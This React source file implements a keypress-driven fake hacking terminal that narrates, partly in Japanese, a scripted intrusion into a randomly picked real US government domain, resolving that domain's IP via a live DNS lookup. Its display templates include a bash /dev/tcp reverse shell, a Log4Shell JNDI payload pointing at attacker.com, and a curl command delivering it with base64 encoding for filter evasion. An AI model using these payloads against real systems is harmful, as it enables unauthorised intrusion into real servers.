import React, { useState, useEffect, useRef } from 'react';

const REAL_GOV_DOMAINS = [
  "cia.gov", "fbi.gov", "nasa.gov", "pentagon.mil", "defense.gov", "whitehouse.gov", "nsa.gov"
];

const REAL_CVE_DATABASE = [
  "[FOUND] CVE-2021-44228 - CVSS: 10.0 - Apache Log4j2 JNDI Remote Code Execution",
  "[FOUND] CVE-2021-41773 - CVSS: 7.5 - Apache HTTP Server path traversal and file disclosure",
  "[FOUND] CVE-2014-0160 - CVSS: 5.0 - OpenSSL Heartbleed information disclosure",
  "[FOUND] CVE-2014-6271 - CVSS: 10.0 - Bash Shellshock Remote Code Execution",
  "[FOUND] CVE-2019-11043 - CVSS: 9.8 - PHP-FPM Remote Code Execution in nginx configuration",
  "[FOUND] CVE-2020-1472 - CVSS: 10.0 - Microsoft Active Directory Netlogon (Zerologon)",
  "[FOUND] CVE-2021-4034 - CVSS: 7.8 - Polkit Pkexec Local Privilege Escalation (PwnKit)",
  "[FOUND] CVE-2022-0847 - CVSS: 7.8 - Linux Kernel Dirty Pipe Local Privilege Escalation",
  "[FOUND] CVE-2017-0144 - CVSS: 8.1 - Windows SMB Remote Code Execution (EternalBlue)",
  "[FOUND] CVE-2021-26855 - CVSS: 9.8 - Microsoft Exchange Server SSRF (ProxyLogon)",
  "[FOUND] CVE-2023-4911 - CVSS: 7.8 - GNU C Library ld.so buffer overflow (Looney Tunables)",
  "[FOUND] CVE-2024-3094 - CVSS: 10.0 - XZ Utils backdoor in liblzma",
  "[FOUND] CVE-2018-13379 - CVSS: 9.8 - Fortinet FortiOS SSL VPN credential disclosure",
  "[FOUND] CVE-2019-19781 - CVSS: 9.8 - Citrix ADC and Gateway Remote Code Execution",
  "[FOUND] CVE-2020-0601 - CVSS: 5.4 - Windows CryptoAPI spoofing (CurveBall)"
];

const RECON_LOG_TEMPLATES = [
  { log: "[INFO] Initializing Session for {DOMAIN} infiltration...", msg: "潜入セッション開始。\n暗号化トンネルを確立中。", task: "SESSION INITIALIZATION" },
  { log: "dig +short {DOMAIN} -> {IP}", msg: "DNSプロトコルからターゲットのIPアドレスを特定中。", task: "DNS RESOLUTION" },
  { log: "[INFO] Fetching DNS-over-HTTPS records from Google API...", msg: "Google DNS APIから詳細なDNSレコードを抽出中。", task: "DOH EXTRACTION" },
  { log: "{RAW_JSON}", msg: "受信した生データを解析。\nレコードの整合性を確認。", task: "DATA ANALYSIS" },
  { log: "whois {DOMAIN} | grep 'Registrant Organization'", msg: "WHOIS情報を照会。\nドメインの登録組織を特定中。", task: "WHOIS QUERY" },
  { log: "Registrant Organization: US Government Agency", msg: "登録組織が政府機関であることを確認。\nターゲットを固定。", task: "TARGET VERIFICATION" },
  { log: "subfinder -d {DOMAIN} -all -silent", msg: "サブドメインの列挙を実行。\nアタックサーフェスを拡張中。", task: "SUBDOMAIN ENUM" },
  { log: "[FOUND] api.{DOMAIN}", msg: "APIゲートウェイを検出。\nバックエンドへの接続ポイントとして記録。", task: "SUBDOMAIN ENUM" },
  { log: "[FOUND] dev.{DOMAIN}", msg: "開発環境を捕捉。\n構成不備の可能性を調査対象に追加。", task: "SUBDOMAIN ENUM" },
  { log: "[FOUND] vpn.{DOMAIN}", msg: "VPNエンドポイントを捕捉。\n内部ネットワークへのバイパスを検討。", task: "SUBDOMAIN ENUM" },
  { log: "[FOUND] secure-gateway.{DOMAIN}", msg: "認証ゲートウェイを特定。\n認証プロトコルの解析を開始。", task: "SUBDOMAIN ENUM" },
  { log: "httpx -list subdomains.txt -status-code -title", msg: "各サブドメインの稼働状況とHTTPステータスを確認中。", task: "HTTP SERVICE SCAN" },
  { log: "https://dev.{DOMAIN} [403] [Access Denied]", msg: "開発サーバーへのアクセス拒否を確認。\nWAFの存在を検知。", task: "HTTP SERVICE SCAN" },
  { log: "https://api.{DOMAIN} [200] [API Gateway]", msg: "APIサーバーの応答を確認。\n侵入口としてマーク。", task: "HTTP SERVICE SCAN" },
  { log: "https://secure-gateway.{DOMAIN} [200] [Enterprise Portal]", msg: "ポータルの稼働を確認。\n脆弱性調査リストに追加。", task: "HTTP SERVICE SCAN" },
  { log: "[INFO] Detecting WAF (Web Application Firewall)...", msg: "防御製品（WAF）のベンダーとバージョンの特定を開始。", task: "WAF DETECTION" },
  { log: "wafw00f https://{DOMAIN}", msg: "WAFフィンガープリントを解析中。", task: "WAF DETECTION" },
  { log: "The site https://{DOMAIN} is behind Cloudflare WAF.", msg: "Cloudflareによる保護を確認。\n回避戦略を策定中。", task: "WAF DETECTION" },
  { log: "[SUCCESS] Phase 1: Reconnaissance complete. Target surface mapped.", msg: "フェーズ1：偵察完了。\nターゲットのネットワークマップ作成に成功。", task: "RECON COMPLETE" },
];

const VULN_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 2: Vulnerability Analysis...", msg: "フェーズ2：脆弱性診断を開始。\n特定したサービスの詳細なスキャンを実行中。", task: "SCAN INITIALIZATION" },
  { log: "nmap -sV -T4 {IP}", msg: "Nmapによるサービスバージョンの特定を実行中。", task: "NMAP PORT SCAN" },
  { log: "Scanning {IP}:22 (ssh) ... [OPEN] OpenSSH 8.2p1", msg: "SSHサービス（ポート22）が稼働中。\nバージョン8.2p1を検出。", task: "NMAP PORT SCAN" },
  { log: "Scanning {IP}:80 (http) ... [OPEN] Apache 2.4.41", msg: "HTTPサービス（ポート80）が稼働中。\nバージョン2.4.41を検出。", task: "NMAP PORT SCAN" },
  { log: "Scanning {IP}:443 (https) ... [OPEN] nginx 1.18.0", msg: "HTTPSサービス（ポート443）が稼働中。\nnginx 1.18.0を検出。", task: "NMAP PORT SCAN" },
  { log: "Scanning {IP}:8080 (http-proxy) ... [OPEN] Apache Log4j 2.14.0", msg: "プロキシサーバー（ポート8080）にてLog4jの特定バージョンを検出。", task: "NMAP PORT SCAN" },
  { log: "[INFO] Correlating service versions with CVE database...", msg: "検出したサービスと既知の脆弱性データベースを照合中。", task: "CVE CORRELATION" },
  { log: "{WAIT_SEARCH}", msg: "CVEデータベースを検索中。\n整合性を検証しています。", task: "DATABASE SEARCH" },
  { log: "{CVE_DATA}", msg: "照合完了。\n該当する脆弱性リストを抽出中。", task: "CVE CORRELATION" },
  { log: "[!] VULNERABILITY DETECTED: CVE-2021-44228 (Log4Shell)", msg: "重大な脆弱性を特定。\nCVE-2021-44228によるRCEが可能。", task: "VULN IDENTIFIED" },
  { log: "[!] CVSS Score: 10.0 (CRITICAL)", msg: "脆弱性スコア10.0を確認。\nフルアクセス権限奪取が可能。", task: "VULN IDENTIFIED" },
  { log: "[SUCCESS] Phase 2: Vulnerability Analysis complete. Entry point identified.", msg: "フェーズ2：脆弱性診断完了。\n侵入口となる脆弱性の特定に成功。", task: "ANALYSIS COMPLETE" }
];

const ACCESS_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 3: Initial Access...", msg: "フェーズ3：初期潜入を開始。\n攻撃基盤の準備を行っています。", task: "ACCESS INITIATION" },
  { log: "[INFO] Determining localhost public IP address...", msg: "ローカルサーバーのパブリックIPを取得中。", task: "LOCAL SETUP" },
  { log: "LOCALHOST IP: {ATTACKER_IP}", msg: "ローカルサーバーのIPを特定。\n接続待機ポートを4444にセット。", task: "LOCAL SETUP" },
  { log: "Generating reverse shell command...", msg: "ターゲット上で実行させる通信確立用コマンドを生成中。", task: "CMD GENERATION" },
  { log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1", msg: "ターゲットのBash入出力をローカルサーバーと接続し、\n操作権を移譲するコードを構築。", task: "CMD GENERATION" },
  { log: "[INFO] Encoding command to Base64 for WAF/IDS bypass...", msg: "セキュリティ製品の検知を回避するため、コマンドをBase64でエンコード中。", task: "PAYLOAD ENCODING" },
  { log: "B64 ENCODED: {B64_CMD}", msg: "エンコード完了。\nBase64シリアライズされたペイロードを構築。", task: "PAYLOAD ENCODING" },
  { log: "Constructing final JNDI injection payload...", msg: "JNDIプロトコルに適合する最終的な攻撃パケットを構成中。", task: "PAYLOAD FINAL" },
  { log: "PAYLOAD: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}", msg: "Log4Shell用ペイロードが完成。\nターゲットへ送信する準備が整いました。", task: "PAYLOAD FINAL" },
  { log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/", msg: "ターゲットの8080ポートへ\nHTTP POSTリクエストを送信中。", task: "EXPLOIT EXECUTION" },
  { log: "[INFO] Payload sent. Waiting for reverse connection...", msg: "リクエスト送信完了。\nターゲットからのバックコネクトを待機。", task: "SHELL LISTENER" },
  { log: "{WAIT_SEARCH}", msg: "ポート4444にてリスナー待機中。\n認証バイパスを確認しています。", task: "SHELL LISTENER" },
  { log: "[+] Connection received from {IP}:49210", msg: "接続確立。\nターゲットサーバー内のプロセス制御権を獲得しました。", task: "CONNECTION ESTABLISHED" },
  { log: "www-data@target-server:/$ whoami", msg: "侵入後のカレントユーザーを確認中。", task: "PRIVILEGE CHECK" },
  { log: "www-data", msg: "ユーザー「www-data」として潜入成功。\n低権限シェルを確立しました。", task: "PRIVILEGE CHECK" },
  { log: "[SUCCESS] Phase 3: Initial Access successful. Connection stabilized.", msg: "フェーズ3：初期潜入に成功。\n内部ネットワークへの足がかりを確保。", task: "ACCESS SUCCESS" }
];

const ESCALATION_LOG_TEMPLATES = [
  { log: "[INFO] Starting Phase 4: Privilege Escalation...", msg: "フェーズ4：権限昇格を開始。\nroot権限（管理者）の奪取を試みます。", task: "LPE INITIATION" },
  { log: "www-data@target-server:/$ python3 linpeas.py", msg: "システム内部の脆弱性を列挙するため、自動調査スクリプトを実行中。", task: "ENUMERATION" },
  { log: "{WAIT_SEARCH}", msg: "LinPEASによる内部調査中。\n設定ミスやSUIDバイナリを探索しています。", task: "ENUMERATION" },
  { log: "[!] SUID binary found: /usr/bin/pkexec", msg: "SUIDビットが設定された不審なバイナリを発見。\nエクスプロイトの可能性があります。", task: "VECTOR IDENTIFIED" },
  { log: "[INFO] Exploiting PwnKit (CVE-2021-4034)...", msg: "pkexecの脆弱性を利用して、管理者権限への昇格コードを実行します。", task: "LPE EXECUTION" },
  { log: "www-data@target-server:/$ gcc exploit.c -o exploit && ./exploit", msg: "エクスプロイトコードをコンパイルし、メモリ破壊攻撃を開始。", task: "LPE EXECUTION" },
  { log: "[+] Exploit successful. Switching UID to 0...", msg: "エクスプロイト成功。\nプロセスID 0（root）への移行を確認しました。", task: "PRIVILEGE GAINED" },
  { log: "root@target-server:/# whoami", msg: "最終的な権限を確認中。", task: "PRIVILEGE GAINED" },
  { log: "root", msg: "最高権限「root」の奪取に成功。\nシステムの完全支配を達成。", task: "PRIVILEGE GAINED" },
  { log: "[SUCCESS] Phase 4: Privilege Escalation successful. Full system control granted.", msg: "フェーズ4：権限昇格成功。\n極秘データへのアクセスが可能になりました。", task: "MISSION COMPLETE" }
];

const App: React.FC = () => {
  const [displayedLogs, setDisplayedLogs] = useState<string[]>([]);
  const [activeMessage, setActiveMessage] = useState<string>("Initializing hacker_os...");
  const [activeTask, setActiveTask] = useState<string>("BOOTING SYSTEM");
  const [targetIP, setTargetIP] = useState<string>("0.0.0.0");
  const [attackerIP] = useState(() => `${Math.floor(Math.random() * 200 + 40)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
  const [rawJSON, setRawJSON] = useState<string>("{}");
  const [targetDomain] = useState(() => REAL_GOV_DOMAINS[Math.floor(Math.random() * REAL_GOV_DOMAINS.length)]);
  const [phase, setPhase] = useState<1 | 2 | 3 | 4>(1);
  const [waitingForEnter, setWaitingForEnter] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  
  const [cpuLoad, setCpuLoad] = useState<number>(12.4);
  const [netTraffic, setNetTraffic] = useState<string>("240.5 KB/s");
  const [uptime, setUptime] = useState<string>("00:00:00:00");
  const startTimeRef = useRef(Date.now());
  
  const logIndexRef = useRef(0);
  const keyCounterRef = useRef(0);
  const bottomRef = useRef<HTMLDivElement>(null);

  const KEYS_PER_LINE = 2;

  useEffect(() => {
    const fetchRealIP = async () => {
      try {
        const response = await fetch(`https://dns.google/resolve?name=${targetDomain}&type=A`);
        const data = await response.json();
        setRawJSON(JSON.stringify(data, null, 2));
        if (data.Answer && data.Answer.length > 0) {
          setTargetIP(data.Answer[0].data);
        } else {
          setTargetIP("104.16.148.244");
        }
      } catch (error) {
        console.error("DNS Resolution failed:", error);
        setTargetIP("23.62.106.138");
      }
    };
    fetchRealIP();
  }, [targetDomain]);

  useEffect(() => {
    const timer = setInterval(() => {
      setCpuLoad(prev => {
        const delta = (Math.random() - 0.5) * 3;
        const next = prev + delta;
        return next < 8 ? 8.1 : next > 35 ? 34.9 : next;
      });
      const speed = (Math.random() * 400 + 100).toFixed(1);
      setNetTraffic(`${speed} KB/s`);
      const diff = Date.now() - startTimeRef.current;
      const days = String(Math.floor(diff / 86400000)).padStart(2, '0');
      const hh = String(Math.floor((diff % 86400000) / 3600000)).padStart(2, '0');
      const mm = String(Math.floor((diff % 3600000) / 60000)).padStart(2, '0');
      const ss = String(Math.floor((diff % 60000) / 1000)).padStart(2, '0');
      setUptime(`${days}:${hh}:${mm}:${ss}`);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const jumpToPhase = (targetPhase: 1 | 2 | 3 | 4) => {
    setPhase(targetPhase);
    logIndexRef.current = 0;
    keyCounterRef.current = 0;
    setWaitingForEnter(false);
    setIsSearching(false);
    setDisplayedLogs([]);
    
    if (targetPhase === 1) {
      setActiveMessage("Initializing hacker_os...");
      setActiveTask("BOOTING SYSTEM");
    } else if (targetPhase === 2) {
      setActiveMessage("フェーズ2：脆弱性診断を開始します。");
      setActiveTask("SCAN INITIALIZATION");
    } else if (targetPhase === 3) {
      setActiveMessage("フェーズ3：初期潜入を開始します。");
      setActiveTask("ACCESS INITIATION");
    } else if (targetPhase === 4) {
      setActiveMessage("フェーズ4：権限昇格を開始します。");
      setActiveTask("LPE INITIATION");
    }
  };

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (waitingForEnter || isSearching) {
        if (e.key === 'Enter' && waitingForEnter) {
          const nextPhase = (phase + 1) as 1 | 2 | 3 | 4;
          if (nextPhase <= 4) {
            setWaitingForEnter(false);
            setPhase(nextPhase);
            logIndexRef.current = 0;
            keyCounterRef.current = 0;
            setActiveMessage(`フェーズ${nextPhase}を開始します。`);
          }
        }
        return;
      }

      if (e.key.length > 1 && e.key !== 'Enter' && e.key !== 'Space' && e.key !== 'Backspace') return;

      keyCounterRef.current += 1;
      
      if (keyCounterRef.current >= KEYS_PER_LINE) {
        const currentIndex = logIndexRef.current;
        const templates = {
          1: RECON_LOG_TEMPLATES,
          2: VULN_LOG_TEMPLATES,
          3: ACCESS_LOG_TEMPLATES,
          4: ESCALATION_LOG_TEMPLATES
        };
        const currentTemplates = templates[phase];
        
        if (currentIndex < currentTemplates.length) {
          const item = currentTemplates[currentIndex];
          
          if (item.log === "{RAW_JSON}") {
            const jsonLines = rawJSON.split('\n');
            setDisplayedLogs(prev => [...prev, ...jsonLines]);
          } else if (item.log === "{CVE_DATA}") {
            setDisplayedLogs(prev => [...prev, ...REAL_CVE_DATABASE]);
          } else if (item.log === "{WAIT_SEARCH}") {
            setIsSearching(true);
            setDisplayedLogs(prev => [...prev, "Processing system call... [WAIT]"]);
            setTimeout(() => {
              setDisplayedLogs(prev => [...prev, "Operation complete. Accessing buffer..."]);
              setIsSearching(false);
              logIndexRef.current += 1;
            }, 2500);
            return;
          } else {
            const revShellCmd = `bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`;
            const base64Cmd = btoa(revShellCmd);

            const logLine = item.log
              .replace(/{IP}/g, targetIP)
              .replace(/{DOMAIN}/g, targetDomain)
              .replace(/{ATTACKER_IP}/g, attackerIP)
              .replace(/{B64_CMD}/g, base64Cmd);
            setDisplayedLogs(prev => [...prev, logLine]);
          }
          
          setActiveMessage(item.msg);
          setActiveTask(item.task);
          logIndexRef.current += 1;

          if (logIndexRef.current === currentTemplates.length) {
            if (phase < 4) {
              setWaitingForEnter(true);
              setActiveMessage(`フェーズ${phase}完了。システム診断のため[ENTER]キーを押してください。`);
              setActiveTask("PHASE TRANSITION");
            } else {
              setActiveMessage("ミッション完了。全システムを掌握しました。");
              setActiveTask("MISSION ACCOMPLISHED");
            }
          }
        }
        keyCounterRef.current = 0;
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [targetIP, attackerIP, targetDomain, rawJSON, phase, waitingForEnter, isSearching]);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [displayedLogs]);

  return (
    <div className="bg-black h-screen w-screen text-[#00ff41] flex overflow-hidden font-['JetBrains_Mono']">
      <div className="fixed inset-0 pointer-events-none opacity-5 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%] z-50"></div>
      
      <div className="w-2/3 h-full p-8 flex flex-col justify-start items-start select-text overflow-y-auto leading-none border-r border-[#00ff41]/20 scrollbar-hide">
        <div className="w-full max-w-7xl z-10 flex flex-col text-base md:text-lg pb-24 tracking-tighter">
          {displayedLogs.map((log, i) => {
            const isTargetServer = log.includes('@target-server') || log === 'www-data' || log === 'root';
            return (
              <div key={i} className="flex space-x-3 py-0">
                <span className="opacity-40 text-[11px] shrink-0 select-none mt-1 text-green-300">[{new Date().toLocaleTimeString()}]</span>
                <span className={`
                  ${isTargetServer ? 'text-[#ffb000]' : ''}
                  ${log.startsWith('[SUCCESS]') ? 'text-cyan-400 font-bold' : ''}
                  ${log.startsWith('[INFO]') ? 'text-yellow-100 font-bold' : ''}
                  ${log.startsWith('[FOUND]') ? 'text-blue-300' : ''}
                  ${log.startsWith('[!]') ? 'text-red-500 font-black' : ''}
                  ${log.startsWith('[+]') ? 'text-white font-bold' : ''}
                  ${log.includes('Searching') || log.includes('Processing') ? 'text-white' : ''}
                  ${log.includes('[200]') ? 'text-green-300 font-semibold' : ''}
                  ${log.includes('[403]') ? 'text-red-400' : ''}
                  ${log.trim().startsWith('"') || log.trim().startsWith('{') || log.trim().startsWith('}') || log.trim().startsWith(']') ? 'text-gray-500 text-sm opacity-70 whitespace-pre leading-none' : ''}
                `}>
                  {log}
                </span>
              </div>
            );
          })}
          <div className="flex items-center space-x-4 pt-3">
            <span className={`font-bold shrink-0 opacity-80 select-none ${
              phase >= 4 && displayedLogs.some(l => l.includes('root@target-server')) ? 'text-[#ffb000]' : 
              phase >= 3 && displayedLogs.some(l => l.includes('www-data@target-server')) ? 'text-[#ffb000]' : 
              'text-[#00ff41]'
            }`}>
              {phase >= 4 && displayedLogs.some(l => l.includes('root@target-server')) ? 'root@target-server:/#' : 
               phase >= 3 && displayedLogs.some(l => l.includes('www-data@target-server')) ? 'www-data@target-server:/$' : 
               'root@hacker_os:~#'}
            </span>
            <div className="flex flex-col">
              {waitingForEnter ? (
                <span className="text-white font-bold text-sm bg-green-900 px-2 py-1 ml-2 border border-white/20">PRESS [ENTER] TO PROCEED</span>
              ) : isSearching ? (
                <span className="text-yellow-400 font-bold text-sm ml-2 tracking-widest">SYSTEM PROCESSING... [WAIT]</span>
              ) : (
                <span className={`w-2.5 h-5 shrink-0 ${
                  phase >= 3 && displayedLogs.some(l => l.includes('@target-server')) ? 'bg-[#ffb000]' : 'bg-[#00ff41]'
                }`}></span>
              )}
            </div>
          </div>
          <div ref={bottomRef} />
        </div>
      </div>

      <div className="w-1/3 h-full bg-[#001100] p-10 flex flex-col z-20 shadow-[-10px_0_30px_rgba(0,0,0,0.5)] border-l border-[#00ff41]/10 overflow-hidden">
        <div className="h-full flex flex-col">
          <div className="mb-6 flex gap-2 overflow-x-auto pb-2 scrollbar-hide shrink-0">
            {[1, 2, 3, 4].map((p) => (
              <button
                key={p}
                onClick={() => jumpToPhase(p as any)}
                className={`text-[9px] px-3 py-1 border transition-all duration-300 ${
                  phase === p 
                    ? 'bg-[#00ff41] text-black border-[#00ff41] font-bold shadow-[0_0_10px_rgba(0,255,0,0.5)]' 
                    : 'bg-transparent text-[#00ff41] border-[#00ff41]/30 hover:border-[#00ff41] hover:shadow-[0_0_5px_rgba(0,255,0,0.2)]'
                }`}
              >
                PHASE {p}
              </button>
            ))}
          </div>

          <div className="mb-8 border-b border-[#00ff41]/30 pb-4 shrink-0">
            <h2 className="text-xs uppercase tracking-widest opacity-50 mb-2 font-sans font-bold text-[#00ff41]">System Narrative Monitor</h2>
            <div key={phase} className="text-cyan-400 font-bold text-sm uppercase tracking-tighter mb-1">
              ACTIVE PHASE: {phase === 1 ? 'RECONNAISSANCE' : phase === 2 ? 'VULNERABILITY ANALYSIS' : phase === 3 ? 'INITIAL ACCESS' : 'PRIVILEGE ESCALATION'}
            </div>
            <div key={activeTask} className="text-green-500 text-[10px] uppercase tracking-[0.2em] font-bold animate-fade-in">
              CURRENT TASK: {activeTask}
            </div>
          </div>

          <div className="flex-1 flex flex-col justify-center min-h-0 py-10">
            <div className="w-full bg-[#002200] border-l-4 border-green-500 p-6 shadow-[0_0_20px_rgba(0,255,0,0.1)]">
              <p key={activeMessage} className="text-green-100 text-sm md:text-base xl:text-lg leading-relaxed animate-fade-in font-sans whitespace-pre-wrap break-words text-left">
                {activeMessage}
              </p>
            </div>
          </div>

          <div className="mt-auto opacity-50 text-[11px] space-y-3 font-mono border-t border-[#00ff41]/10 pt-6 shrink-0">
            <div className="flex justify-between items-center text-[#00ff41]">
              <span className="tracking-widest">CPU LOAD:</span>
              <div className="flex items-baseline space-x-1">
                <span className="text-white font-bold text-base">{cpuLoad.toFixed(1)}</span>
                <span className="text-[10px] opacity-70">%</span>
              </div>
            </div>
            <div className="flex justify-between items-center text-[#00ff41]">
              <span className="tracking-widest">NET TRAFFIC:</span>
              <span className="text-white font-bold text-base">{netTraffic}</span>
            </div>
            <div className="flex justify-between items-center text-[#00ff41]">
              <span className="tracking-widest">SESSION UPTIME:</span>
              <span className="text-white font-bold text-base">{uptime}</span>
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateX(5px); }
          to { opacity: 1; transform: translateX(0); }
        }
        .animate-fade-in {
          animation: fadeIn 0.3s ease-out;
        }
        ::selection {
          background-color: #00ff41;
          color: black;
        }
      `}</style>
    </div>
  );
};

export default App;
